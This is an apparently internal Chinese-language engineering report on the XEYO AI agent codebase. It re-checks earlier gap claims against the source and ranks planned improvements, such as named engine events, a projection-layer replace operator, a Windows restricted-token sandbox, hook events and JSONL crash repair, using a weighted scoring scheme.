| **①** | **命名事件瀑布**（第一步只做"命名 + 观测"，不要求可替换） | 收益量级高（9/10）+ 杠杆满分（5/5）+ 适配满分（5/5），综合 **30.0** |
| **②** | **投影层通用 `replace` 算子 + `sourceEventSeqs`** | 收益 8/10 + 适配满分（层已存在，只扩算子）+ 综合 **27.5** |
| ③ | 沙箱 confine + Windows restricted-token 后端 | **收益满分（10/10）**，但适配 3/5、成本 2/5 → 综合 26.5 |

**并且本轮推翻了上一份收官报告的 P0 清单**：它列的 P0-3（工具结果头尾预算 + spill 可取回）**早已完整实现**，P1-5 里的"工具配对平衡"**也早已实现**。剔除假差距后，P0 只剩一项。

---

##### §1 先更正：三项被误判为"待做"的其实早已存在

这是本文最重要的部分之一。**如果按上一份文档开工，第一件事就是重写已经写好的代码。**

###### 更正 A：P0-3「工具结果头尾预算 + spill 到文件可取回」—— 已完整实现

上一份文档 `:167` 把它列为 P0，落点写的是 `tools/bash_tool/truncate.py`。实测这条链**有三层，且每层都已就位**：

| 层 | 实现 | 常量 / 行为 |
|---|---|---|
| ① **语义压缩**（XEYO 独有） | `tools/bash_tool/cmd_compact.py`（12 KB，**6 个族压缩器**） | `_compact_pytest` / `_compact_test_runner` / `_compact_tsc` / `_compact_lint` / `_compact_git` / `_compact_build`；门槛 `_MIN_CHARS = 4_000`，`_MAX_GROUPED_FILES = 40`。在硬截断**之前**压掉 test/build/git 噪声，失败与 traceback 保留 |
| ② **硬截断 + 原始落盘** | `tools/bash_tool/truncate.py`（96 行） | `DEFAULT_LIMIT = 30_000`、`HEAD_CHARS = 20_000`、`TAIL_CHARS = 8_000`；**中段错误行抢救** `MAX_ERROR_EXCERPT_LINES = 8` / `MAX_ERROR_EXCERPT_CHARS = 800`，`_ERR_LINE_RE` 匹配 22 类错误标记；全文落 `persist_dir`，模板尾部给 `[output truncated, full at {path} ({n} chars)]` |
| ③ **registry 级 spill seam** | `tools/tool_registry.py:179-234` `_apply_output_budget` | `DEFAULT_OUTPUT_BUDGET = 16_000`、`PREVIEW_HEAD = 6_000`、`PREVIEW_TAIL = 2_000`；走 `tools/spill.py::save_text` 落盘 + 审计事件 `tool.spill`（记 `path`/`original_chars`/`spill_bytes`）+ 元数据 `spilled/spill_path/truncation="output_budget"` |

`tools/spill.py`（117 行）本身也已超出"最小可用"：`O_EXCL` 独占创建绝不覆盖、POSIX `0600`、按会话命名空间 `~/.xeyo/spill/<safe_session>/`、保留期清理 `XEYO_SPILL_RETENTION_DAYS`（默认 7 天）、**spill 失败绝不抛给调用方**（"宁可超预算，不可假证据"）。

**而且"双重截断"这个坑早被显式规避**——`tools/meta.py`：

```
:111-112   # T1：Read 豁免 spill——防 read→spill→read 循环。
           output_budget=0,
:146-148   # T1：Bash 自带 raw→落盘→截断 seam（truncate_for_model），豁免
           # registry 级预算，避免双重截断/双重落盘。
           output_budget=0,
```

我在本轮一度假设"bash 的 20k/8k 承诺会被 registry 的 6k/2k 覆盖"，**这个假设是错的**——Bash 与 Read 都被 `output_budget=0` 豁免，registry 预算只作用于其余工具。这是一个**已完成的设计决策**，不是待办。

###### 更正 B：P1-5 里的「工具配对平衡」—— 已实现

上一份文档 `:169` 把"压缩事务化：括号事务 + 工具配对平衡"列为 P1，理由是"XEYO 的 C0/C1/C2 是截断不是事务"。**"配对"这一半不成立**：

```
engine/compact.py:69    def tool_pair_ranges(...)      # 识别 assistant(tool_calls)+连续 tool 的成对区间
engine/compact.py:87    def _keep_tail_rounds(...)     # KEEP_TAIL_TOOL_ROUNDS = 3
engine/compact.py:95    def keep_tail_cut(...)         # cut 点吸附到配对完整处
engine/compact.py:116   def split_at_cursor(...)
engine/compact.py:24-27 MAX_TOOL_RESULT_CHARS = 8_192  # 与 dsh pruner 的 8192 同值
                       KEEP_TAIL_MESSAGES = 6
```

`engine/compact.py` 的文件头也写明了它是**投影层压缩**，不是主链改动：

```
"""L5 摘要记忆：送模型投影（不改 MessageStore / JSONL）。
C0 截断始终做；C1 占位按 frozen_until 应用（runtime 按公式推进冻结边界），
本函数不自行决定窗口，保证两次 C1/C2 之间投影字节稳定。C2 由 runtime 处理。"""
```

**真实差距收窄为**：cut 点已配对安全，但（a）压缩**不是事务**——没有"压缩前落一条事件、可回滚"的语义；（b）XEYO 靠 **事后修补**（`_repair_unpaired_tool_calls`）兜底，dsh 靠**事前原子**。这是一条**降级后的中等项**，不是"新模块 + 配对算法"。

###### 更正 C（承接前几轮）：投影层、写后缓冲、fsync 也都已存在

| 曾以为缺 | 实际 | 证据 |
|---|---|---|
| 投影层 | **已存在** | `session/surface.py`（150 行）`fold_surface_rows`；`session/hydrate.py` 组装 `messages_from_rows(resolve_transcript_rows(fold_surface_rows(rows), path))` |
| JSONL 写后缓冲 | **已存在** | `session/record_transcript.py:122 _writer_loop`、`:143 _write_batch`、`:183 flush_pending_sync`、`:194` atexit 排空 |
| fsync | **已存在** | `:156 os.fsync(f.fileno())  # 崩溃窗口不丢会话尾部(G107)`——**有事故编号** |
| 轮转 | **已存在** | `:50-65` `_max_transcript_bytes()` 默认 32 MB、保留 2 代归档 |
| 写路径互斥 | **部分存在** | `:39 _disk_lock = threading.Lock()` + `_disk_lock` 覆盖 rotate+append（`:150-156`） |

###### 更正小结：P0 重新定义后只剩一项

| 上一份文档 | 本文判定 |
|---|---|
| P0-3 工具结果头尾预算 + spill | **删除**（已实现，见更正 A） |
| P0-4 JSONL 撕裂尾修复 + 跨进程租约 | **保留**（唯一真 P0，见 §5.5） |
| P1-5 的工具配对平衡部分 | **删除**（已实现，见更正 B）；只留"事务化" |
| P1-3 投影层泛化 | **保留但降级为"扩算子"**（层已存在） |
| P1-6 命名事件瀑布 | **保留，且本轮升级为第 ① 优先** |
| P2-1 沙箱 | **保留，收益量级第一但顺序不动** |

---

##### §2 剔除假差距后的真实候选池

**入选条件**：本轮源码复核确认为真差距，且在五轮报告里出现过。

| # | 候选 | 类型 | 现状证据（查过才有资格入池） | XEYO 现有对应物 |
|---|---|---|---|---|
| 1 | **沙箱 confine + Windows restricted-token** | 能力·信任 | 全仓排除 `.venv` 后 `landlock\|seatbelt\|bwrap\|sandbox-exec` **零命中**；`tools/bash_tool/win_job.py` 是**资源限额**（Job Object）非隔离 | 权限链 11 级 + `bash_policy.py` 18 条黑名单（**文本分析**） |
| 2 | **命名事件瀑布** | 结构·杠杆 | `engine/query_loop.py`（2,000 行）内联点：`evaluate_policy` `:175`、`repeat_guard.observe` `:1069`、`budget.prepare_next_turn` `:800`、`maybe_force_compact_on_pressure` `:850`、`run_pre_llm_inject` 包装 `:645`；`extension/hooks.py` 只在工具门禁/会话边界接缝被调用 | `audit.record`（只记不派发） |
| 3 | **投影层通用 `replace` 算子 + `sourceEventSeqs`** | 结构·能力 | `session/surface.py:36-38` 只有 `_OP_REWIND` / `_OP_REWIND_UNDO` 两个**单用途** op；无来源追踪字段 | `fold_surface_rows` + `active_markers` + `has_undo_marker` |
| 4 | **C2 压缩事务化（可归因 + 可回滚）** | 能力·成本 | `engine/compact.py` 是投影截断；`_repair_unpaired_tool_calls` 为事后修补 | `tool_pair_ranges` / `frozen_until` / `_C2_LLM_PREFETCH_MIN_MESSAGES = 24` |
| 5 | **hooks 事件面扩展** | 生态·扩展 | `extension/hooks.py:24` `EVENTS = ("PreToolUse","PostToolUse","PermissionRequest","SessionStart","SessionEnd")` —— **5 个**；docstring 自陈"`Subagent*` / `UserPromptSubmit` / `PrePostCompact` **预留**" | hooks 执行器已完整（子进程 / 三分结果 / PermissionRequest fail-closed / stdout 经 reconcile 进 T_now） |
| 6 | **JSONL 撕裂尾修复 + 跨进程租约** | 可靠性 | `:249-250 except json.JSONDecodeError: continue`（静默跳过、不可观测）；`:39 _disk_lock = threading.Lock()`（**进程内**） | 写后缓冲 + fsync + 32 MB 轮转 + 按 id 去重 |
| 7 | **会话事件自查询工具** | 能力·可观测 | 工具表 `tools/meta.py` 无 session-query 类；`tools/journal_query_tool` 是**多代理工作区变更**查询（`memory.journal`），非会话事件查询 | `rewind`/`journal` 读侧 API 已存在，但未做成工具 |
| 8 | **覆盖率 ratchet** | 质量 | 无覆盖率门；`scripts/check.ps1` 为 pytest + typecheck + vitest | pytest 307 文件 / vitest 102 文件 |
| 9 | **时间触发型定时任务** | 能力 | `engine/scheduler.py`（1,110 行）是**任务 DAG**（toposort/环打破/scope 冲突），被 `subagent_runner.py` 等 5 处消费——**不是**时间触发 | 后台 bash job（24 h 超时） |
| 10 | 前端插槽化 | 结构 | `gui/src` **134 个 `.tsx` 单体**；`grep registerSlot\|slots\|pluginRegistry` **零命中** | 无 |

**同时明确剔除（不入池，理由见 §7）**：跨会话记忆召回重开、Typert RPC、Cordis 式 255 包重组、per-file 100% 覆盖率门、双 SDK / ACP、i18n、E2B / PTY / LSP、workflow + ralph。

---

##### §3 评分口径：为什么要把"收益"和"适配"拆开

"完美优化 XEYO"这句话里其实塞了**两个独立诉求**，混在一起必然选错：

- **"收益巨大"** = 做完之后产品能力强多少 → 这是**收益**维度
- **"最适合/完美"** = 是否顺着 XEYO 已有的架构肌理走、做完不欠新债 → 这是**适配**维度

一个点的收益可以巨大，但如果它要新建一层、改变现有行为边界、让已有的十几处机制作废，那它就**不完美**。反之亦然。

###### 五维打分（1–5，两个反向维度已翻正）

| 维度 | 含义 | 高分的表现 |
|---|---|---|
| **B** 收益量级 | 直接影响多少产品能力 | 5 = 改变产品边界；1 = 只影响边角场景 |
| **L** 杠杆 | 是否让**其他优化**变便宜 | 5 = 成为后续一切的扩展点；1 = 孤立 |
| **F** 适配度 | 是否顺着已有肌理走 | 5 = 扩已有机制 / 有明文约定的落点；1 = 需新建架构层 |
| **C** 成本（翻正） | 工程量反向 | 5 = S 级（单文件小改）；1 = 大型新建 |
| **R** 风险（翻正） | 行为变化/回归风险反向 | 5 = 关掉逐字节一致；1 = 改变现有行为边界 |

**综合 = (B + L) × 2 + F × 1.5 + (C + R) / 2**（满分 37.5）

- 前两项 `(B+L)×2` 是"**收益巨大**"的量化：收益量级 + 杠杆，权重最高。
- 中间 `F×1.5` 是"**完美适配**"的量化。
- 末项 `(C+R)/2` 是**可行性**，权重最低——因为这份文档的立场是**先看收益与适配，再看好不好做**；一个点哪怕便宜，收益小就不该进榜。

###### "完美适配"的三条硬判据

一个点要拿到 F ≥ 4，必须至少满足两条：

1. **有明文约定的落点**——`AGENTS.md` 的硬规矩（反巨石 / 新功能先旁路）已经为它指定了位置；
2. **扩已有机制，而非新建层**——代码里已有承担同一语义的结构；
3. **可旁路验证**——能做成 `sidecar/` 形态或 feature flag，关掉即逐字节恢复。

> **`sidecar/` 是 XEYO 最被低估的资产。** `sidecar/policy.py`（58 行）+ `sidecar/upgrade.py`（75 行）构成一套完整的"侧挂→升格"基建：`XEYO_SIDEMOD_PROMOTE`（默认 1）一键开合，已挂 6 个挂钩型模块（`memory.memindex_sig_shadow` / `tools.fileio.content_index_cache_shadow` / `memory.eval_cold_memory_shadow` / `tools.spill_shadow` / `prompt.transcript_pointer_shadow` / `memory.rerank_preference_shadow`）+ 4 个纯函数型（pollution / reporting / strict_env / blind_audit）。**`AGENTS.md` 硬规矩第 4 条「新功能先以旁路形态上线验证收益」在这里被代码化了**——任何新优化都能以此形态进场，且 `upgrade.py` 的 fail-open 语义（单模块失败不挡引擎构建）保证零风险。

---

##### §4 全候选评分表

| # | 点 | B | L | F | C | R | **综合** | 榜位 |
|---|---|---|---|---|---|---|---|---|
| 2 | **命名事件瀑布**（第一步只命名+观测） | 4 | **5** | **5** | 4 | **5** | **30.0** | ① 最优选择 |
| 3 | **投影层通用 `replace` 算子 + `sourceEventSeqs`** | 4 | 4 | **5** | 4 | 4 | **27.5** | ② |
| 1 | **沙箱 confine + Windows restricted-token 后端** | **5** | **5** | 3 | 2 | 2 | **26.5** | ③ 收益第一 |
| 5 | **hooks 事件面扩展**（5 → 9 事件） | 3 | 4 | **5** | 4 | 4 | **25.5** | ④ |
| 4 | **C2 压缩事务化**（可归因 + 可回滚） | 4 | 3 | 4 | 3 | 3 | **23.0** | ⑤ |
| 6 | JSONL 撕裂尾修复 + 跨进程租约 | 2 | 2 | **5** | **5** | **5** | **20.5** | ⑥ 真 P0 |
| 7 | 会话事件自查询工具 | 3 | 2 | 4 | 4 | 4 | **20.0** | ⑦ |
| 8 | 覆盖率 ratchet（不做 per-file 100%） | 2 | 3 | 4 | 4 | 4 | **20.0** | ⑦ |
| 9 | 时间触发型定时任务 | 3 | 2 | 3 | 3 | 4 | **18.0** | ⑨ |
| 10 | 前端插槽化 | 3 | 3 | 2 | 2 | 2 | **17.0** | 不入榜 |

###### 拆两个榜看，结论更有意思

**「收益量级榜」（B + L，满分 10）**：

```
沙箱            ██████████ 10   ← 收益最大
命名事件瀑布     █████████   9
投影层算子       ████████    8
hooks 扩展       ███████     7
C2 压缩事务      ███████     7
```

**「完美适配榜」（F，满分 5）**：

```
命名事件瀑布     █████ 5   ← 最完美
投影层算子       █████ 5
撕裂尾+租约      █████ 5
hooks 扩展       █████ 5
沙箱            ███   3   ← 失分点
```

**两个榜的交集就是本文推荐的前两名。** 沙箱在两个榜上都靠前，但适配度掉到 3——它要在 `tools/bash_tool/runner.py`（`:160`、`:345` 两个 spawn 点）**新建一层 `confine()` 抽象**，且 confine 生效后"原本能跑的命令会失败"，是**唯一改变现有行为边界**的改动。

###### 关于"杠杆"这一维的具体解释（它决定了排名）

杠杆不是抽象概念，本轮把它落成可核验的提问：**做完这个点之后，原本需要"改引擎"的事，能不能变成"挂插件"？**

| 点 | 做完之后，什么变便宜了 |
|---|---|
| 命名事件瀑布 | 后续**每个** guard / 拦截 / 观测都从"改 `query_loop.py`"变成"挂一个命名事件"。今天 `repeat_guard`、`budget`、`compact`、`evaluate_policy` 都是**内联调用点**，加第五个就得再改一次巨石 |
| 投影层算子 | C2 压缩事务化、任意"改写过去"的能力、来源追踪审计——全部统一到一条 fold 路径 |
| hooks 事件面扩展 | 外部插件（用户侧）能拦到 `Stop` / `SubagentStop` / `UserPromptSubmit` / `PreCompact`——**这是产品生态面，dsh 已有而 XEYO 缺** |
| 沙箱 | 权限链可从 11 级收粗、bash 黑名单可从 18 条收窄、`XEYO_BASH_UNSAFE_ALLOW` 这条"没有 jail 就不给全权"的补丁可以退役。**但它让这些变便宜的前提是权限链已经在别处被命名事件/审计铺好** |

---

##### §5 收益巨大的点，逐个论证

###### §5.1 ① 命名事件瀑布 —— 综合最优（30.0）

###### 它现在长什么样（本轮实测的内联点全集）

`engine/query_loop.py` 是 2,000 行巨石。引擎级的可插拔语义点**全部是内联函数调用**，没有一个是命名事件：

| 语义点 | 行号 | 形态 |
|---|---|---|
| 权限判定 | `:175` `decision = evaluate_policy(name, raw_input, cwd=registry.cwd, tool=tool)` | 直接函数调用（在 `_eligible_for_early` 内） |
| 重复调用守卫 | `:1069` `guard_action = repeat_guard.observe(tu.name, tu.input)` | 直接方法调用，返回值 `:1072 _ = guard_action` **被丢弃** |
| 预算推进 | `:800` `if not budget.prepare_next_turn():` | 直接方法调用 |
| 强制压缩 | `:850` `if maybe_force_compact_on_pressure(...)` | 直接函数调用 |
| 上下文注入 | `:645-686` 薄封装委托 `prompt.pre_llm_inject.run_pre_llm_inject` | 包装函数 |
| 投机任务取消 | `:179` `_cancel_early_tasks`，调用点 `:1164` `:1364` `:1416` `:1440` | 直接函数调用 ×4 |
| 投机资格判定 | `:93` `_EARLY_BLOCKLIST`、`:112` `early_readonly_tools_enabled()`、`:155` `_eligible_for_early` | 模块级私有 |

**对比：XEYO 只有一处在"接缝"上**——`extension/hooks.py` 自陈"本模块不自含调度/主循环；只在工具门禁 / 会话边界的**接缝**被调用（AGENTS.md 反巨石：新逻辑进新模块，巨石仅留调点）"。**接缝这个概念已经存在，只是只被用在了工具门禁一处。**

###### 为什么收益巨大（B=4、L=5）

杠杆满分不是修辞。今天要在"模型请求发出前"插一个新机制，唯一路径是**再改一次 `query_loop.py`**；有了命名事件，路径变成**挂一个监听器**。而 `AGENTS.md` 硬规矩第 7 条「反巨石」已经把"新逻辑一律进新模块，既有巨石只留接线点"写成机器执法级约束——**这个点在偿还一笔已经存在的技术债**。

同时它带来一个立竿见影的真实收益：**可观测**。今天回答"这一回合引擎做了什么决策"只能读代码；命名事件 + 现有 `audit.record` 直接给出时序。注意 XEYO 已经有 `tool_call.begin` 参数摘要（`query_loop.py:100-105`，压成单行 JSON 截 200 字符）这类为审计做的准备，说明审计通道是现成的。

###### 为什么适配完美（F=5）

三条硬判据全中：

1. **有明文约定的落点**——`AGENTS.md` 第 7 条就是为它写的；
2. **扩已有机制**——`extension/hooks.py` 已经定义了"接缝 + 命名事件 + 三分结果 + 超时 + fail-policy"这套完整语义，只是场景限制在工具边界；引擎级命名事件是同一套语义的推广，不是新发明；
3. **可旁路验证**——`sidecar/policy.py::side_enabled()` 现成可用。

###### 关键：第一步只做"命名 + 观测"

这是它风险 R=5 的原因。**第一步不改任何语义**：

```
新增 engine/events.py（新模块，符合反巨石）：
  - 定义命名事件常量：turn/start · turn/end · llm/before-request · llm/after-response
    · tool/pre-execute · tool/post-execute · compact/before · compact/after
    · budget/warn · guard/triggered · permission/decided
  - emit(name, **fields) → 写 audit（复用 default_audit_log()）+ 可选 telemetry
query_loop.py 只做一件事：在上述 7 个内联点旁边各加一行 emit(...)
```

**"可替换"留到第二步，且不承诺。** 这样做的收益是：即使第二步永不做，第一步也已经拿到观测与审计；而第二步（允许 sidecar 挂到事件上）的成本因为第一步的命名而大幅下降。

###### 判据（构造性，不依赖任何外部判分）

- **关掉后逐字节一致**：`XEYO_SIDEMOD_PROMOTE=0`（或专用 flag）下，模型可见请求体与审计输出与改动前**逐字节相同**；
- **事件完整**：跑一个含工具调用的回合，审计里出现 `turn/start → llm/before-request → tool/pre-execute → tool/post-execute → turn/end` 的**有序**序列；
- **零回归**：`python/.venv/Scripts/python.exe -m pytest python -m "not live"` 全绿 + `npx tsc --noEmit`。

###### 风险

R=5——**前提是坚持"第一步只命名"**。一旦在第一步就引入"事件可改写行为"，风险立刻从 5 掉到 3（因为改的是 2,000 行巨石里的执行顺序）。**这条边界必须在实施时写死。**

---

###### §5.2 ② 投影层通用 `replace` 算子 + `sourceEventSeqs` —— 适配最完美（27.5）

###### 它现在长什么样

`session/surface.py` 已经完整实现了"append-only 是唯一真相，模型可见面 = fold"这套语义，文件头写得比很多设计文档还清楚：

```
surface/generation 模型：
- append-only JSONL 是唯一真相，回溯不再重写文件，而是追加一条 surface_op marker 行，
  把「当时可见面」从 shadow_from 起的区间影子化（shadow）——原始行永不改写、永不移动。
- 模型可见历史 = 对合并日志（含轮转归档 .old2→.old1→当前）做一次 fold_surface_rows
```

**但它只有两个单用途算子**（`:36-38`）：

```python
_OP_REWIND = "rewind"           # 影子化 shadow_from 起至可见面末尾
_OP_REWIND_UNDO = "rewind_undo" # 恢复该 rewind_id 影子化的全部行
```

###### 为什么这是差距（而不是"设计如此"）

dsh 对应实现的算子集是 `append | {op: 'replace'}`——**一个通用替换算子**，外加每条事件带 `sourceEventSeqs` 来源追踪（第三/四轮实测）。差别不是"多一个 op"，而是：

| | XEYO | dsh |
|---|---|---|
| 算子语义 | `rewind` = 影子化**到末尾** | `replace` = 替换**任意区间** |
| 能表达的 | "退回某一轮" | "把这一段换成那一段" |
| 来源追踪 | 无 | `sourceEventSeqs` 指向被替换的原事件 |
| 可承载 | 回溯 | 回溯 **+** 压缩结果 **+** 注入覆盖 **+** 审计溯源 |

**`rewind` 是 `replace` 的一个特例**（`to = null` 且区间到尾）。XEYO 把特例做成了唯一实现，于是**压缩、覆盖、注入这三类需求都无法用同一条路径表达**——这是多个机制难以统一的**根因**（第五轮 Part C 的 C-3 已指出同一现象）。

###### 为什么适配完美（F=5）

这是全表**成本最低的"结构性"改动**：

1. **层已存在**（150 行），`fold_surface_rows` 的 fold 循环结构（`:77-115`）天然支持追加分支：
   ```
   for row in rows:
       if is_surface_marker(row):
           op = str(row.get("op") or "")
           → 加一个 elif op == _OP_REPLACE: 分支，用 {from_id, to_id} 替换区间
   ```
2. **兼容性契约已经写好**——文件头已声明"旧 transcript 无 marker → fold 恒等"，新 op 对旧数据天然无影响；
3. **`active_markers` / `has_undo_marker` 两个辅助函数（`:117-150`）只需各加一个分支**，v2 物理重写路径的"回填 active marker 永远方向安全"这条既有论证依然成立。

###### 收益（B=4、L=4）

- **直接收益**：人类侧永远能看到完整 append-origin 历史，模型侧看到折叠后的可见面——**审计与上下文彻底解耦**，而这正是 XEYO 已有架构的**既定分工**（文件头原文："与「模型看 surface、人看 append-origin」的分工一致"）；
- **杠杆收益**：§5.6 的 C2 压缩事务化**直接依赖它**（压缩结果就是一次 `replace`）；`sourceEventSeqs` 让"这条上下文是哪来的"可回答——这是可审计性的地基。

###### 判据

- **G1 旧数据不变**：对不带 `replace` marker 的既有 transcript，`fold_surface_rows` 输出与改动前**逐元素相同**；
- **G2 新算子幂等**：同一 `replace` marker 重复 fold 结果稳定；
- **G3 可逆**：`replace` 后追加 undo marker，可见面精确回到替换前（用 20 行 → 替换为 3 行 → undo → 恢复 20 行 的构造用例）；
- **G4 来源可查**：`sourceEventSeqs` 指向的原事件 id 在合并日志中确实存在。

---

###### §5.3 ③ 沙箱 confine + Windows restricted-token —— 收益量级第一（26.5）

###### 为什么收益巨大（B=5、L=5）

这是**唯一一个改变产品能力边界**的点。今天的 XEYO 在 Windows 上：

- 用 `tools/bash_tool/win_job.py` 做 **Job Object 资源限额**——那是"别把机器跑死"，**不是隔离**；
- 全仓（排除 `.venv`）搜 `landlock|seatbelt|bwrap|sandbox-exec` **零命中**；
- 于是安全只能靠**文本分析**：`permissions/policy.py` 的 11 级分支 + `permissions/bash_policy.py` 的 `_DENY_RULES` + 193 行 bash 语义分析反推写目标；
- 并且必须给自己上一道"没有 jail 就不给全权"的补丁：`bash_mode=="allow"` 时若无 `XEYO_BASH_UNSAFE_ALLOW=1` 且非 `full` profile → **自动降回 `default`**。

**沙箱把这些全部重构**：可信边界从"我们正则匹配到了危险命令"换成"内核不允许写"。直接后果：

1. **误拒变少**——现在被 18 条黑名单挡掉的合法命令可以放行；
2. **模型少绕路**——今天模型撞上 DENY 后往往换写法重试（白烧 token）；
3. **`bash_mode=allow` 可以真正安全**，不用再靠环境变量兜底；
4. **权限链有资格收粗**——11 级分支里相当一部分是为"补隔离的缺失"而存在的。

###### 为什么适配度只有 3

三条硬判据它只中一条半：

| 判据 | 判定 |
|---|---|
| 有明文约定的落点 | ❌ 无。要在 `tools/bash_tool/runner.py`（`:160`、`:345` 两个 spawn 点）**新建 `confine()` 抽象层** |
| 扩已有机制 | ⚠️ 半中。`win_job.py` 是同一个执行层，但语义不同（资源限额 vs 隔离），不能复用 |
| 可旁路验证 | ⚠️ 半中。可旁路，但**关掉它 ≠ 逐字节一致**——confine 生效后"原本能跑的命令会失败"，这是行为变化 |

###### 但它有一个被低估的适配优势：dsh 有 Windows 后端可直接对照

前几轮曾把沙箱判为"XEYO 是 Windows 产品所以用不了"——**这个判断是错的**（第五轮已更正）。dsh 有 `packages/sandbox/sandbox-windows-acl`，且有 43 行设计决策记录。它的路线：

- `CreateRestrictedToken`，标志 `WRITE_RESTRICTED` + `DISABLE_MAX_PRIVILEGE` + `LUA_TOKEN`；
- **核心洞察：只交写访问，读沿用调用者权限 → 不需要改宿主 DACL**（AppContainer / restricted-user 方案需要大改 DACL，因此被否决）；
- per-workspace SID = `sha256(规范路径)` → `S-1-4-x-y`；per-session 随机 temp + **独立 SID**（所以 fork 不能写兄弟的 temp）；
- probe 真跑一次；**fail-closed**；自发标 `enforcement:'partial'` 并用测试钉死已知缺口（Everyone 授权对象、硬链接别名）。

对一个 **Windows 优先**的 XEYO，这是**可直接对照移植**的设计，且它自带一份"为什么这么做"的论证。

###### 为什么它排第三而不是第一

三个理由，缺一不可：

1. **它是唯一改变现有行为边界的改动**（做完后原本能跑的命令会失败）；
2. **它是唯一无法旁路验证的**——不能靠"关掉后逐字节一致"证明安全，只能靠"read-only 下写失败、读成功"这类构造性用例；
3. **它会连带让现有的权限链与黑名单部分作废**——先做它，那 11 级链 + 18 条规则可能白改。

**它必须等 §5.1（命名事件）铺好"拦截点在哪观测"、§5.4（hooks 事件面）铺好"失败时怎么优雅降级"之后再动。**

###### 判据

- **read-only 下写失败、读成功**（构造性，不依赖外部判分）；
- **越界写被拒**：写工作区外路径 → 拒绝，且拒绝原因来自 OS 层而非正则；
- **fail-closed**：沙箱不可用时不静默降级为无沙箱（今天 `PLATFORM_CHAINS.win32` 曾为空 → 降级 `danger-full-access`，那是一次已修复的事故，回归测试必须覆盖）；
- **`enforcement` 自陈诚实**：已知缺口（Everyone、硬链接别名）必须有测试钉死，不允许写在注释里。

###### 红线

沙箱**不得按执行通道分叉**。`AGENTS.md` 明文禁止"容器路由就跳过"这类评测条件分支——那属于应试修改。

---

###### §5.4 ④ hooks 事件面扩展 —— 兑现自己预留的欠条（25.5）

###### 它现在长什么样

`extension/hooks.py:24`：

```python
EVENTS = ("PreToolUse", "PostToolUse", "PermissionRequest", "SessionStart", "SessionEnd")
```

文件头 docstring 紧接着写着：**"事件（`Subagent*` / `UserPromptSubmit` / `PrePostCompact` 预留）"**。

**"预留"两个字就是本文给它 F=5 的理由**——这不是"照 dsh 抄"，这是**兑现 XEYO 自己开的欠条**。

###### 两端事件对照（本轮实测）

| 事件 | XEYO | dsh（Claude Code 桥） |
|---|---|---|
| `PreToolUse` | ✅ | ✅ |
| `PostToolUse` | ✅ | ✅ |
| `SessionStart` | ✅ | ✅ |
| `SessionEnd` | ✅ | — |
| `PermissionRequest` | ✅（**fail-closed DENY**） | — |
| `UserPromptSubmit` | ⏳ 预留 | ✅ |
| `Stop` | — | ✅ |
| `SubagentStop` | ⏳ 预留（`Subagent*`） | ✅ |
| `PreCompact` / `PostCompact` | ⏳ 预留 | — |

**两端各有所长**：XEYO 独有 `PermissionRequest`（且做成了 fail-closed）与 `SessionEnd`；dsh 独有 `Stop` / `SubagentStop` / `UserPromptSubmit`。

###### 为什么收益巨大（B=3、L=4）

这不是内部机制，是**产品生态面**。hooks 是用户与第三方插件接入 XEYO 生命周期的**唯一外部通道**：

- `UserPromptSubmit` 让插件能在用户提交时注入/拦截；
- `Stop` / `SubagentStop` 让插件能感知"回合结束"（今天做不到——这是最常见的告警/通知挂点）；
- `PreCompact` / `PostCompact` 让插件能在压缩前后介入（长会话治理的关键挂点）。

而且执行器**已经完整**：子进程执行、超时 `_DEFAULT_TIMEOUT_S = 600.0`、三分结果（`Success` / `FailedContinue` / `FailedAbort`）、`fail_policy` 可配、环境剥离仓库级 `GIT_*`、注入 `XEYO_HOOK_CONTEXT`、`command` 相对插件根且 manifest 已校验禁越界、stdout 经 `extension.reconcile.publish_reconcile_block` 进 T_now 管线（事件类静默即失、绝不门控）。**加事件几乎只是扩 `EVENTS` 元组 + 补发射点。**

###### 一个必须注意的设计细节（两端一致，值得保留）

`PermissionRequest` 任一非 `Success` → **fail-closed DENY**（短路工具调用，绝不静默放行）。这条不能因为扩展事件面而放松。

###### 判据

- **每个新事件都有真实发射点**（不能只有常量没有 emit——这会变成下一个"写了无消费方"）；
- **关掉后零执行、零注入**（docstring 已承诺"逐位 = 停产"，回归测试守住）；
- **`fail_policy=abort` 与超时都归入 `FailedAbort`** 的行为不变。

###### 风险

R=4。唯一的坑是：新事件如果**在错误的位置**发射（例如 `Stop` 在真正停止前发），会让插件做出错误判断。发射点必须与 §5.1 的命名事件**一起定义**，不要分两次做。

---

###### §5.5 ⑥ JSONL 撕裂尾修复 + 跨进程租约 —— 两个真 P0（20.5）

###### 它现在长什么样（两处，都已实测）

**撕裂尾**：`session/record_transcript.py:247-250` 读侧

```python
try:
    obj = json.loads(line)
except json.JSONDecodeError:
    continue
```

崩溃导致半行 JSON 时，**静默跳过**。方向是安全的（不崩），但**不可观测**——用户永远不知道自己少了哪条，引擎也不会留下任何记录。

**跨进程**：`session/record_transcript.py:39`

```python
_disk_lock = threading.Lock()
```

**纯进程内锁**。写侧已有的保护是完整的（`_writer_loop` 后台线程 `:122`、批量 `_write_batch` `:143`、`os.fsync` `:156` 带事故编号 G107、32 MB 轮转 `:50-65`、按 id 去重 `:251-253`、atexit 排空 `:194`），**唯独没有跨进程互斥**。

###### 为什么它是"真 P0"（C=5、R=5、F=5）

这是全表**唯一一个三项满分**的点：

| 维度 | 理由 |
|---|---|
| 成本 5 | 两处都是 S 级。撕裂尾 = 把坏行**旁置到 `<name>.jsonl.torn`** 而不是丢弃 + 审计一条可见记录；跨进程 = 一个租约文件（PID + 心跳 + 过期）包住 `_disk_lock` 覆盖的 `:150-156` 临界区 |
| 风险 5 | **关掉后逐字节一致**。撕裂尾修复只改"坏行去哪"；租约只在多进程竞争时生效，单进程路径不变 |
| 适配 5 | 完全顺着已有实现：`_disk_lock` 的位置已经标好了临界区边界；`_maybe_rotate` 已经在同一临界区内（`:150-156`），租约不需要新临界区 |

###### 为什么收益只是"中"（B=2、L=2）

诚实说：**触发频率低**。撕裂尾需要恰好崩溃在半行写入；跨进程需要同一会话被两个进程同时写。所以它**不是"收益巨大"**——它进榜的原因是**"性价比最高"**：几乎零成本、零风险、修掉一类"静默数据损坏 + 不可观测"的隐患。

这与上一份收官文档的判断一致（它在 P0 里也是性价比最高的一条），**本文维持**。

###### 判据

- **撕裂尾**：往 transcript 注入半行 JSON（构造），读侧不抛错、坏行出现在旁置文件、审计里有记录；
- **租约**：两个进程同时 append（构造），无交错损坏；租约过期后自动可获取；
- **单进程零变化**：单进程路径下，写出的字节与改动前**完全相同**。

---

###### §5.6 ⑤ C2 压缩事务化 —— 依赖 ②，收益实在（23.0）

###### 它现在长什么样

